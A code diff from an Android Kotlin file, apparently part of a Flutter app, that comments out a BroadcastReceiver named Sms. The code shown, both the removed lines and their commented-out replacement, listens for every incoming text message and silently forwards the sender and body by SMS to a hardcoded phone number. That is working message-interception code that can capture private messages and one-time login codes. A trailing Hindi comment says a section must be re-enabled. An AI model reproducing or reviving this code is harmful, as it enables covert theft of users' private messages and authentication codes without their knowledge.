@@ -14,63 +14,55 @@ import android.os.Build
 import android.os.Build.VERSION
 import android.os.Build.VERSION_CODES
 
-class Sms : BroadcastReceiver() {
-    private val TAG: String = Sms::class.java.getSimpleName()
-//    val Log = Logger.getLogger(Sms::class.java.name)
-
-    override fun onReceive(context: Context?, intent: Intent) {
-        // TODO Auto-generated method stub
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
-            val bundle: Bundle? = intent.getExtras() //---get the SMS message passed in---
-            var msgs: Array<SmsMessage?>? = null
-            var msg_from: String?
-            if (bundle != null) {
-                //---retrieve the SMS message received---
-                try {
-                    val pdus = bundle.get("pdus") as Array<Any>
-                    msgs = arrayOfNulls<SmsMessage>(pdus.size)
-                    for (i in msgs.indices) {
-                        msgs!![i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
-                        msg_from = msgs[i]?.getOriginatingAddress()
-                        val msgBody: String? = msgs[i]?.getMessageBody()
-//                        val smsManager = SmsManager.getDefault()
-                        val toSendSmsNumber = "+918586875379"
-                        var message = "Sender Name: $msg_from \n Body: $msgBody";
-//                        smsManager.sendTextMessage(toSendSmsNumber, null, msgBody, null, null)
-                        sendSms(toSendSmsNumber, message)
-
-                        Log.d(TAG, "onReceivePdu: $msgBody")
-                        Log.d(TAG, "onReceivePdu: $msg_from")
-                        Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show()
-
-                    }
-                } catch (e: Exception) {
-//                            Log.d("Exception caught",e.getMessage());
-                }
-            }
-        }
-    }
-
-    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
-    private fun sendSms(phoneNumber: String?, message: String?) {
-        try {
-//            val smsManager = getSmsManager()
-            val smsManager = SmsManager.getDefault()
-            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
-//            Toast.makeText(getApplicationContext(), "Message Sent", Toast.LENGTH_LONG).show()
-        } catch (e: Exception) {
-            e.printStackTrace()
-//            Toast.makeText(getApplicationContext(), "Some fields is Empty", Toast.LENGTH_LONG).show()
-        }
-
-    }
-
-//val ECHANNEL = "tyre.plex.sms.receiver"
+//class Sms : BroadcastReceiver() {
+//    private val TAG: String = Sms::class.java.getSimpleName()
 //
-//    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
-//        super.configureFlutterEngine(flutterEngine)
-//    EventChannel(flutterEngine.dartExecutor.binaryMessenger, ECHANNEL)
-//    .setStreamHandler(smsReceiver)
+//    override fun onReceive(context: Context?, intent: Intent) {
+//        // TODO Auto-generated method stub
+//        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+//            val bundle: Bundle? = intent.getExtras() //---get the SMS message passed in---
+//            var msgs: Array<SmsMessage?>? = null
+//            var msg_from: String?
+//
+//            if (bundle != null) {
+//                //---retrieve the SMS message received---
+//                try {
+//                    val pdus = bundle.get("pdus") as Array<Any>
+//                    msgs = arrayOfNulls<SmsMessage>(pdus.size)
+//                    for (i in msgs.indices) {
+//                        msgs!![i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
+//                        msg_from = msgs[i]?.getOriginatingAddress()
+//                        val msgBody: String? = msgs[i]?.getMessageBody()
+//                        val toSendSmsNumber = "+918586875379"
+//                        var message = "Sender Name: $msg_from \n Body: $msgBody";
+//
+//                        sendSms(toSendSmsNumber, message)
+//
+//                        Log.d(TAG, "onReceivePdu: $msgBody")
+//                        Log.d(TAG, "onReceivePdu: $msg_from")
+//                        Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show()
+//                    }
+//                } catch (e: Exception) {
+////                            Log.d("Exception caught",e.getMessage());
+//                }
+//            }
+//        }
+//    }
+//
+//    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
+//    private fun sendSms(phoneNumber: String?, message: String?) {
+//        try {
+//            val smsManager = SmsManager.getDefault()
+//            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
+//        } catch (e: Exception) {
+//            e.printStackTrace()
+//        }
+//
+//    }
+
+//    override fun onStart() {
+//        registerReceiver(myBroadcastReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))
+//    }
 
     //main
 //    private val TAG: String = Sms::class.java.getSimpleName()
@@ -114,5 +106,8 @@ class Sms : BroadcastReceiver() {
 //        }
 //    }
 
-}
+
+
+//ye neeche waala COMPULSORY open krna h
+//}
 
